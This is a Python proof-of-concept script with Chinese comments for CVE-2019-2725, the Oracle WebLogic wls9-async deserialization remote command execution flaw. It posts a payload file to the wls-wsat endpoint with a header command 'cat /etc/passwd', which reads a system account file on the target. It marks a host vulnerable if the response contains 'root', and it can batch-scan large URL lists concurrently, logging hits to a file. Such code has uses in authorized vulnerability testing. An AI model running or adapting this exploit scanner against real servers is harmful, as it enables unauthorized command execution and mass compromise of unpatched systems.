#author: 九世
#time: 2019/6/16
#file poc.py

from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
import gevent
import os
import requests
import threading
import optparse

data=''
headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36','CMD': 'cat /etc/passwd','SOAPAction': '""','Content-Type': 'text/xml'}
paths='/wls-wsat/CoordinatorPortType11;/../x '

class Scan:
    def __init__(self,id):
        self.id=id

    def pd(self,id,tp):
        global data
        if id=='1':
            print('[+] 单个检测')
            print('[+] 检测payload文件是否存在')
            if os.path.exists('payload.txt'):
                print('')
                print('[+] 加载检测')
                dk = open('payload.txt', 'r')
                data+=("".join(str(dk.read()).split('\n')))
                self.dan(tp,data)
            else:
                print('[-] payload文件不存在')
                exit()
        elif id=='2':
            print('[+] 批量检测')
            print('[+] 检测payload文件是否存在')
            if os.path.exists('payload.txt'):
                if os.path.exists(tp):
                    print('[+] 批量测试文件:{}存在'.format(tp))
                    self.djc(tp)
                else:
                    print('[-] 批量测试文件不存在:{}'.format(tp))
                    exit()
            else:
                print('[-] payload文件不存在')
                exit()


    def dan(self,url,data):
        url=str(url).rstrip('/')+paths
        try:
            rqt=requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
            if 'root' in rqt.text:
                print('[+] 存在CVE-2019-2725漏洞,url:{}'.format(rqt.url))
                print('[+] 存在CVE-2019-2725漏洞,url:{}'.format(rqt.url),file=open('save.txt','a',encoding='utf-8'))
            else:
                print('[-] 不存在CVE-2019-2725漏洞,url:{}'.format(rqt.url))
        except Exception as r:
            print('[-] Error:{}'.format(r))
            pass

    def djc(self,file):
        urls=[]
        calc=0
        dk=open(file,'r',encoding='utf-8')
        for z in dk.readlines():
            if calc==100:
                p=Process(target=self.xc,args=(urls,))
                p.start()
                calc=0
                urls.clear()
            qc="".join(z.split('\n'))
            urls.append(qc)
            calc+=1

        if len(urls)>0:
            p = Process(target=self.xc, args=(urls,))
            p.start()
    def xc(self,rg):
        global data
        dk = open('payload.txt', 'r')
        data += ("".join(str(dk.read()).split('\n')))
        rw=[]
        for r in rg:
            rw.append(gevent.spawn(self.dan,r,data))
        for i in range(10):
            t=threading.Thread(target=gevent.joinall,args=(rw,))
            t.start()


def main():
    debugger = {'CVE编号：': 'CVE-2019-2725', '参考文章：': 'https://paper.seebug.org/909/',
                '漏洞介绍：': "这个漏洞最先由某厂商报给某银行，某银行再将该信息报给CNVD，后CNVD通告：国家信息安全漏洞共享平台（CNVD）收录了由中国民生银行股份有限公司报送的Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814），详情见链接：cnvd对于该漏洞，Oracle官方也破例了一回，提前发了补丁，但是这个补丁只是针对10.3.6系列的，对于12版本系列还未披露补丁。所以还是请各位谨慎对待，勒索大军跃跃欲试"}

    usage = 'poc.py -i id'
    parser = optparse.OptionParser(usage)
    parser.add_option('-i', dest='id', help='id为1是单个检测，id为2是批量检测')
    parser.add_option('-c', dest='cve', help='漏洞的详细信息', action='store_true')
    parser.add_option('-u', dest='url',help='单个测试的url')
    parser.add_option('-f', dest='file',help='测试文件里的url')
    (options, args) = parser.parse_args()
    if options.cve:
        d_key = list(debugger.keys())
        d_value = list(debugger.values())
        for d in range(0, len(d_key)):
            print('{}{}'.format(d_key[d], d_value[d]))
    elif options.id == '1' and options.url:
        id=options.id
        tp=options.url
        obj = Scan(id)
        obj.pd(id,tp)
    elif options.id == '2' and options.file:
        id=options.id
        tp=options.file
        obj = Scan(id)
        obj.pd(id,tp)
    else:
        parser.print_help()
        exit()

if __name__ == '__main__':
    main()